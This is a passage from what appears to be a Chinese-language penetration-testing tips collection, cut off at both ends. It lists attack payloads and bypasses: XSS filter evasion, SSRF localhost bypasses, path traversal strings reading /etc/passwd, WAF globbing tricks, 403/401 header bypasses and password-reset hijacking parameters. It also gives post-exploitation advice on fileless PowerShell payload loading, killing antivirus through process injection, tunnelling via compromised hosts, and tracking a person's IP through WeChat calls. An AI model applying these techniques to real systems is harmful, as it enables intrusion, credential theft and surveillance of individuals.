Forgery, 服务端请求伪造)利用漏洞可以发起网络请求来攻击内网服务。<br>使用docker搭建靶场什么的比较好（docker是大佬对漏洞进行复现后写出来的docker文件，减少错误）</p><p>传txt 后html 后传hallo word 最后再传免杀</p><p>固定中间件端口 ip变化  遍历构造看下能不能ping出来</p><p>如果的能ping出来的再用工具找洞</p><p>作业16.了解XSS，SSRF，CSRF，XML注入，JSON注入等漏洞原理过程…..自己选一种漏洞写一篇专题总结文章，必须发表在freebuf，嘶吼，安全客，漏洞盒子 甚至看雪论坛等黑客主流媒体。（crlf）<br>LSB隐写题集</p><p>0x03 PowerShell内存执行exe</p><p>这也是现在红军非常流行的攻击手法，payload在内存中加载执行，也就是所谓的文件不落地，大致分以下几步<br>先将生成的payload在本地进行base64编码</p><p>靶机执行远程下载命令</p><p>靶机对payload进行解码并赋值给一个变量</p><p>PowerShell远程加载Invoke-ReflectivePEInjection模块（PE反射注入）并执行payload</p><p>火绒权限大于360权限大于安全狗 可以注入火绒然后再把360和安全狗杀了<br>但是比较难 不过可以注入360吧360自己和安全狗给杀了（还剩360主动防御）<br>taskkill杀火绒<br>注入回svchost.exe用它去杀死360的主动防御，这次杀死后就不会再生了<br>火绒的父进程是service.exe，可以注入到service.exe中，用service.exe杀Hips*.exe</p><p>分析找线索做表字典<br>进去后先截图既能留作证据又能用于后面隐藏</p><p>shell进去后可以systeminfo看下是什么服务器</p><p>打进去后截屏装载荷，添加信任</p><p>porttunnel 打进去后，将里面的windowsmicrosft防火墙关掉。然后再在肉鸡或者云服务器第一栏填肉鸡转发出去的ip加端口，第二栏写打进去的服务器的ip加端口。再在本地机用cs监听<br>cs可以配置两个端口，一个是打的服务器的 一个是肉鸡的。 还能配置多个云服务器装porttunnel进行转发</p><p><strong>15.access 扫出后缀为asp的数据库文件，访问乱码，</strong>如何实现到本地利用？</p><p>迅雷下载，直接改后缀为.mdb。</p><p>\提权时选择可读写目录，为何尽量不用带空格的目录？</p><p>因为exp执行多半需要空格界定参数</p><p>\某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</p><p>同数据库。</p><p>19:某个防注入系统，在注入时会提示：</p><p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id&#x3D;15<br>提交内容:and 1&#x3D;1</p><p>20、如何利用这个防注入系统拿shell？</p><p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p><p>上传大马后访问乱码时，有哪些解决办法？</p><p>浏览器中改编码。</p><p>目标站发现某txt的下载地址为<br><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p><p>这就是传说中的下载漏洞！在file&#x3D;后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址</p><p>为什么aspx木马权限比asp大？</p><p>aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p><p>如果提示缺少参数，如{msg：params error}，可尝使用字典模糊测试构造参数，进一步攻击。</p><p>程序溢出，int最大值为2147483647，可尝试使用该值进行整数溢出，观察现象。</p><p>验证码简单绕过：重复使用，万能验证码（0000,8888），空验证码，验证码可识别（可用PKAV HTTP Fuzzer工具识别等）</p><p>短信轰炸绕过：手机号前加+86有可能会绕过，手机号输入邮箱，邮箱处输入手机号</p><p>SQL注入时，如果数据库是Mysql，可以尝试使用&amp;&amp;替换and，如：<code>&#39; &amp;&amp; &#39;1&#39;=&#39;1</code>，<code>&#39; %26%26 &#39;1&#39;=&#39;1</code>。</p><p>SQL注入时，如果数据库是Mysql，waf过滤了<code>=</code>，可尝试用<code>like</code>替代。如：<code>and 1 like 1</code></p><p>如果开放了redis服务（1234端口），可以尝试使用<code>/actuator/redis/info</code>语句看是否能读取敏感信息，如：<code>http://www.xxx.com:1234/actuator/redis/info</code></p><p>PI接口处，可以自己构造参数，POST形式传参，可以尝试构造为JSON格式，记得添加<code>content-type: application/json</code>，一些可尝试参数，page，size，id。</p><p>图片验证码可设置为空，如：code&#x3D;undefined</p><p>自动以验证码内容，观察Cookie中，参数中是否有发送给用户的内容，可以尝试更改，可以构造钓鱼链接。</p><p>在JS文件中搜索关键字<code>API</code>，<code>Swagger UI</code>等等，尝试寻找API接口地址。</p><p>信息收集，在搜狗搜索中选择<code>微信</code>可以搜索相关企业相关公众号资产</p><p>swagger接口常见路径：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/swagger/<br><span class="hljs-regexp">/api/swagger</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/swagger</span><span class="hljs-regexp">/ui/</span><br><span class="hljs-regexp">/api/swagger</span><span class="hljs-regexp">/ui/</span><br><span class="hljs-regexp">/swagger-ui.html/</span><br><span class="hljs-regexp">/api/swagger</span>-ui.html/<br><span class="hljs-regexp">/user/swagger</span>-ui.html/<br><span class="hljs-regexp">/swagger/ui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/api</span><span class="hljs-regexp">/swagger/ui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/libs</span><span class="hljs-regexp">/swaggerui/</span><br><span class="hljs-regexp">/api/swaggerui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/swagger</span>-resources/configuration/ui/<br><span class="hljs-regexp">/swagger-resources/configuration</span><span class="hljs-regexp">/security/</span><br></code></pre></td></tr></table></figure><p>swagger组件特征固定title：<code>Swagger UI</code></p><p>如果遇见后台页面一闪而过，接着让你登录，一般使用了权限认证方式，可以用一下方式进行绕过，或者遇见401,403,302，都可以尝试使用以下方法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">一、GET <span class="hljs-regexp">/xxx HTTP/</span><span class="hljs-number">1.1</span> à<span class="hljs-number">403</span><br>Host: test.com<br>绕过：<br>GET <span class="hljs-regexp">/xxx HTTP/</span><span class="hljs-number">1.1</span> à<span class="hljs-number">200</span><br>Host: test.com<br>X-Original-URL: /xxx<br><br>二、GET <span class="hljs-regexp">/xxx HTTP/</span><span class="hljs-number">1.1</span> à<span class="hljs-number">403</span><br>Host: test.com<br>绕过：<br>GET <span class="hljs-regexp">/xxx HTTP/</span><span class="hljs-number">1.1</span> à<span class="hljs-number">200</span><br>Host: test.com<br>Referer: http:<span class="hljs-regexp">//</span>test.com/xxx<br><br>三、<span class="hljs-number">302</span>跳转：拦截并drop跳转的数据包，使其停留在当前页面。<br>四、前端验证：只需要删掉对应的遮挡模块，或者是验证模块的前端代码。<br></code></pre></td></tr></table></figure><p>一款生成gopher协议payload的工具：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/firebroo/</span>sec_tools<br></code></pre></td></tr></table></figure><p>XSS过滤了单引号，等号可以：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">①、使用：String<span class="hljs-selector-class">.fromCharCode</span>(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>);<br>为<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)，该方法输出的结果为字符串，可以使用<span class="hljs-built_in">eval</span>()进行执行，即弹框操作<br><span class="hljs-built_in">eval</span>(String.fromCharCode(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>));<br>②、atob函数：<br><span class="hljs-built_in">eval</span>(atob`YWxlcnQoMSk=`) 为 <span class="hljs-built_in">eval</span>(atob`alert(<span class="hljs-number">1</span>)`) 其中`为反引号<br></code></pre></td></tr></table></figure><p>XSS过滤了单引号，等号以及圆括号，eval：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">①、过滤了<span class="hljs-built_in">eval</span>函数可以用其他函数去绕过，如：<span class="hljs-title class_">Function</span>，constructor<br><span class="hljs-title class_">Function</span><span class="hljs-string">`a<span class="hljs-subst">$&#123;atob<span class="hljs-string">`YWxlcnQoMSk=`</span>&#125;</span>`</span><span class="hljs-string">``</span><br><span class="hljs-string">``</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">constructor</span><span class="hljs-string">`a<span class="hljs-subst">$&#123;atob<span class="hljs-string">`YWxlcnQoMSk=`</span>&#125;</span>`</span><span class="hljs-string">``</span><br></code></pre></td></tr></table></figure><p>可使用下面命令查看是否处在docker虚拟机中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><p>万能密码试试<code>&#39;=0#</code></p><p>36、CORS漏洞验证，可以使用curl来验证：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>www.xxxx.com -H <span class="hljs-string">&quot;Origin: https://test.com&quot;</span> -I<br>检查返回包的 Access-Control-Allow-Origin 字段是否为https:<span class="hljs-regexp">//</span>test.com<br></code></pre></td></tr></table></figure><p>37、在盲测目标系统是否为Shiro时，可以在Cookie中手动构造<code>rememebrMe=xxx</code>，如果返回包中Set-Cookie中存在<code>rememberMe=deleteMe</code>，则证明该系统使用了Shiro，因此可以进一步攻击。<br>38、使用正则获取网站中所包含的其他URL：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">file</span> | <span class="hljs-keyword">grep</span> -Eo <span class="hljs-string">&quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;</span>*<br><br>curl http://host.xx/<span class="hljs-keyword">file</span>.js | <span class="hljs-keyword">grep</span> -Eo <span class="hljs-string">&quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;</span>*<br></code></pre></td></tr></table></figure><p>39、常见的一些远程命令执行（RCE）参数，详情，请看dicts目录下的RCE-extentions.txt文件。</p><p>40、绕过SSRF防护的几个小方法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">A、绕过SSRF限制通过CIDR，如：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.127</span>.<span class="hljs-number">127.127</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span><br><br>B、不完整的地址，如：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span><br><br>C、将地址结合在通过特殊字符结合在一起，如：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> &amp;@<span class="hljs-number">2.2</span>.<span class="hljs-number">2.2</span><span class="hljs-comment"># @3.3.3.3/</span><br>urllib : <span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span><br><br>D、绕过解析器，如：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">80</span>\@<span class="hljs-number">127.2</span>.<span class="hljs-number">2.2</span>:<span class="hljs-number">80</span>/<br><br>E、绕过localhost通过[::]，如：<br>http:<span class="hljs-regexp">//</span>[::]:<span class="hljs-number">80</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0000</span>::<span class="hljs-number">1</span>:<span class="hljs-number">80</span>/<br><br></code></pre></td></tr></table></figure><p>41、几个常用的Google语法：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> intitle:<span class="hljs-string">&quot;index of&quot;</span><br>inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> intitle:<span class="hljs-string">&quot;index of /&quot;</span> <span class="hljs-string">&quot;*key.pem&quot;</span><br>inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> <span class="hljs-keyword">ex</span><span class="hljs-variable">t:log</span><br>inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> intitle:<span class="hljs-string">&quot;index of&quot;</span> <span class="hljs-keyword">ex</span><span class="hljs-variable">t:sql</span>|xls|xml|json|csv<br>inur<span class="hljs-variable">l:example</span>.<span class="hljs-keyword">com</span> <span class="hljs-string">&quot;MYSQL_ROOT_PASSWORD:&quot;</span> <span class="hljs-keyword">ex</span><span class="hljs-variable">t:env</span> OR <span class="hljs-keyword">ex</span><span class="hljs-variable">t:yml</span> -git<br></code></pre></td></tr></table></figure><p>42、通过favicon的hash来对比相关联的两个网站：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">脚本地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/m4ll0k/</span>Bug-Bounty-Toolz<span class="hljs-regexp">/blob/m</span>aster/favihash.py<br>命令：python3 favihash.py -f https:<span class="hljs-regexp">//</span>target/favicon.ico -t targets.txt -s<br></code></pre></td></tr></table></figure><p>43、一些本地包含参数，详情请看dicts目录下的LFI-extentions.txt文件。</p><p>44、在JavaScript文件中可以找一些隐藏的GET参数，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">首先，在js文件中找到一些变量，比如：var <span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;xss&quot;</span><br>然后，可以尝试使用GET方法构造每一个参数，比如：<br>https://example.com/?<span class="hljs-built_in">test</span>=”xsstest<br>本方法可能会发现一些XSS<br></code></pre></td></tr></table></figure><p>45、使用github dorks帮助我们寻找一些敏感信息，比如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">extension</span>:pem private<br><span class="hljs-keyword">extension</span>:ppk private<br><span class="hljs-keyword">extension</span>:<span class="hljs-keyword">sql</span> mysql dump <span class="hljs-keyword">password</span><br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> api.forecast.io<br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> mongolab.com<br><span class="hljs-keyword">extension</span>:yaml mongolab.com<br><span class="hljs-keyword">extension</span>:ica [WFClient] <span class="hljs-keyword">Password</span>=<br><span class="hljs-keyword">extension</span>:avastlic “support.avast.com”<br><span class="hljs-keyword">extension</span>:js jsforce conn.<span class="hljs-keyword">login</span><br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> googleusercontent client_secret<br>“target.com” send_keys<br>“target.com” <span class="hljs-keyword">password</span><br>“target.com” api_key<br>“target.com” apikey<br>“target.com” jira_password<br>“target.com” root_password<br>“target.com” access_token<br>“target.com” config<br>“target.com” client_secret<br>“target.com” <span class="hljs-keyword">user</span> auth<br>通过上述语法，可以搜索到一些敏感的私钥，一些SSH登录私钥，mysql的数据库密码，API key等等。<br>另外推荐一个脚本：https://github.com/techgaun/github-dorks<br></code></pre></td></tr></table></figure><p>46、SSRF常见的参数，详情请看dicts目录下的SSRF-extensions.txt文件。</p><p>47、通过添加<code>.json</code>后缀，泄露一些敏感信息，比如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">一次正常请求：<br>GET <span class="hljs-regexp">/ResetPassword HTTP/</span><span class="hljs-number">1.1</span><br>&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;victim@example.com&quot;</span>&#125;<br>响应：<br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br><br>添加.json后缀的请求：<br>GET <span class="hljs-regexp">/ResetPassword.json HTTP/</span><span class="hljs-number">1.1</span><br>&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;victim@example.com&quot;</span>&#125;<br>响应：<br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>&#123;<span class="hljs-string">&quot;success&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-string">&quot;token&quot;</span>:<span class="hljs-string">&quot;596a96-cc7bf-9108c-d896f-33c44a-edc8a&quot;</span>&#125;<br>原链接：https:<span class="hljs-regexp">//</span>twitter.com<span class="hljs-regexp">/SalahHasoneh1/</span>status/<span class="hljs-number">1293918353971531776</span><br></code></pre></td></tr></table></figure><p>48、如果响应为401，可以试试在请求头中添加<code>X-Custom-IP-Authorization: 127.0.0.1</code></p><p>49、利用火绒剑，配合微信发语音的方式，可以获取该人的登录IP。</p><p>50、目录穿越，敏感文件读取一些Payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">\..\WINDOWS\win.ini<br>..%<span class="hljs-number">5</span>c..%<span class="hljs-number">5</span>c..<span class="hljs-regexp">/winnt/</span>system32<span class="hljs-regexp">/cmd.exe?/</span>c+dir+c:\<br>.?\.?\.?\etc\passwd<br>..<span class="hljs-regexp">/../</span>boot.ini<br>%<span class="hljs-number">0</span>a<span class="hljs-regexp">/bin/</span>cat%<span class="hljs-number">20</span><span class="hljs-regexp">/etc/</span>passwd<br>\\&amp;apos;<span class="hljs-regexp">/bin/</span>cat%<span class="hljs-number">20</span><span class="hljs-regexp">/etc/</span>passwd\\&amp;apos;<br>..%c1%afetc%c1%afpasswd<br></code></pre></td></tr></table></figure><p>51、在访问admin路径面板时可以通过添加<code>%20</code>，来绕过，具体如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span>.com/admin –&gt; HTTP <span class="hljs-number">302</span> (重定向到登录页面)<br><span class="hljs-attribute">target</span>.com/admin%<span class="hljs-number">20</span>/ -&gt; HTTP <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">target</span>.com/%<span class="hljs-number">20</span>admin%<span class="hljs-number">20</span>/ -&gt; HTTP <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">target</span>.com/admin%<span class="hljs-number">20</span>/page -&gt; HTTP <span class="hljs-number">200</span> OK<br></code></pre></td></tr></table></figure><p>52、在重置密码的地方，可以尝试添加另外一个次要的账号，比如，手机号，邮箱号等等，比如：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a、构造两个参数：<br>email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span>&amp;email<span class="hljs-operator">=</span>hacker<span class="hljs-title">@xyz.tld</span><br>b、使用抄送方式:<br>email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%0</span>dcc:hacker<span class="hljs-title">@xyz.tld</span><br><span class="hljs-keyword">c</span>、使用分隔符：<br>email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span><span class="hljs-punctuation">,</span>hacker<span class="hljs-title">@xyz.tld</span><br>email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span><span class="hljs-variable">%20</span>hacker<span class="hljs-title">@xyz.tld</span><br>email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz.tld</span>|hacker<span class="hljs-title">@xyz.tld</span><br>d、不使用域名：email<span class="hljs-operator">=</span>victim<br>e、不使用顶级域名：email<span class="hljs-operator">=</span>victim<span class="hljs-title">@xyz</span><br>f、JSON情况：<br>&#123;<span class="hljs-string">&quot;email&quot;</span>:[<span class="hljs-string">&quot;victim@xyz.tld&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;hacker@xyz.tld&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>53、如果有利用邮箱重置密码功能的情况，而且还是JSON传输的情况下，使用SQLmap跑注入，可以将<code>*</code>（星号）放在<code>@</code>之前，比如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;“email”:”test*@xxx.com”&#125;<br>或者在*（星号）这个地方进行手注<br>原因大家可以看这里：https:<span class="hljs-regexp">//</span>tools.ietf.org<span class="hljs-regexp">/html/</span>rfc3696<span class="hljs-comment">#section-3</span><br><br>原文链接：https:<span class="hljs-regexp">//</span>www.infosecmatter.com<span class="hljs-regexp">/bug-bounty-tips-7-sep-27/</span><span class="hljs-comment">#2_bypass_email_filter_leading_to_sql_injection_json</span><br></code></pre></td></tr></table></figure><p>54、可以获取目标站点的<code>favicon.ico</code>图标的哈希值，然后配合shodan进行目标站点资产收集，因为每个目标站点的<code>favicon.ico</code>图标的哈希值可能是固定值，因此可以通过该方法从shodan，fofa等等去寻找更多资产。简单的用法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#python</span> <span class="hljs-number">3</span><br>import mmh3 <br>import requests<br>import codecs<br>response = requests<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;https://www.baidu.com/favicon.ico&quot;</span>)<br>favicon = codecs<span class="hljs-selector-class">.encode</span>(response<span class="hljs-selector-class">.content</span>,<span class="hljs-string">&quot;base64&quot;</span>)<br>hash = mmh3<span class="hljs-selector-class">.hash</span>(favicon)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(hash)</span></span><br><br>或使用下面这个github项目：<br>https:<span class="hljs-comment">//github.com/devanshbatham/FavFreak</span><br><br>shodan搜索语句：http<span class="hljs-selector-class">.favicon</span><span class="hljs-selector-class">.hash</span>:哈希值<br>fofa搜索语句：icon_hash=<span class="hljs-string">&quot;-247388890&quot;</span>（但仅限于高级用户使用）<br><br>原文链接：https:<span class="hljs-comment">//www.infosecmatter.com/bug-bounty-tips-8-oct-14/#8_database_of_500_favicon_hashes_favfreak</span><br></code></pre></td></tr></table></figure><p>55、绕过403和401的小技巧：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">a、添加以下请求头，比如：X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-For等等；有可能会有一些白名单IP地址可以访问这些敏感数据。<br><br>b、如果使用GET方法访问某些路径，返回<span class="hljs-number">403</span>，可以先访问允许访问的路径，然后在请求头中，添加下面的头：<br>X-Original-URL: /admin<br>X-Override-URL: /admin<br>X-Rewrite-URL: /admin<br><br>c、可以使用下面这些Payload试试<br><span class="hljs-regexp">/accessible/</span>..;/admin<br><span class="hljs-regexp">/.;/</span>admin<br><span class="hljs-regexp">/admin;/</span><br><span class="hljs-regexp">/admin/</span>~<br><span class="hljs-regexp">/./</span>admin<span class="hljs-regexp">/./</span><br>/admin?param<br><span class="hljs-regexp">/%2e/</span>admin<br>/admin<span class="hljs-comment">#</span><br><br>原文链接：https:<span class="hljs-regexp">//</span>www.infosecmatter.com<span class="hljs-regexp">/bug-bounty-tips-8-oct-14/</span><span class="hljs-comment">#11_tips_on_bypassing_403_and_401_errors</span><br></code></pre></td></tr></table></figure><p>56、如果访问<code>/.git</code>目录返回403，别忘了进一步访问下面的目录，比如：<code>/.git/config</code></p><p>57、使用通配符绕过WAF，如果WAF拦截了RCE，LFI的payload，我们可以尝试使用通配符来绕过，比如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/cat /</span>etc<span class="hljs-regexp">/passwd ==  /</span>???<span class="hljs-regexp">/???/</span>c?t<span class="hljs-variable">$IFS</span><span class="hljs-regexp">/?t?/</span>p?s?wd<br>? = 任意的单个字符<br>* = 任意字符串，也包含置空的字符串<br>通配符在常见的系统中都适用，另外我们可以使用<span class="hljs-variable">$IFS</span>特殊变量取代空白<br><span class="hljs-variable">$IFS</span> = 内部字段分隔符 = [space], [tab] 或者 [newline]<br><br>cat <span class="hljs-regexp">/etc$u/</span>p*s*wd<span class="hljs-variable">$u</span><br><br>小例子，执行<span class="hljs-regexp">/bin/</span>cat <span class="hljs-regexp">/etc/</span>passwd的写法：<br><span class="hljs-regexp">/*/</span>?at<span class="hljs-variable">$IFS</span><span class="hljs-regexp">/???/</span>???swd<br><span class="hljs-regexp">/****/</span>?at<span class="hljs-variable">$IFS</span><span class="hljs-regexp">/???/</span>*swd<br><span class="hljs-regexp">/****/</span>?at<span class="hljs-variable">$IFS</span><span class="hljs-regexp">/???/</span>*******swd<br><br>原文地址：https:<span class="hljs-regexp">//</span>www.infosecmatter.com<span class="hljs-regexp">/bug-bounty-tips-9-nov-16/</span><span class="hljs-comment">#8_waf_bypass_using_globbing</span><br></code></pre></td></tr></table></figure><p>58、绕过403的一个BurpSuit插件，地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sting8k/</span>BurpSuite_403Bypasser<br></code></pre></td></tr></table></figure><p>59、SSRF bypass列表，基于localhost（127.0.0.1），如下：</p><figure class="highlight 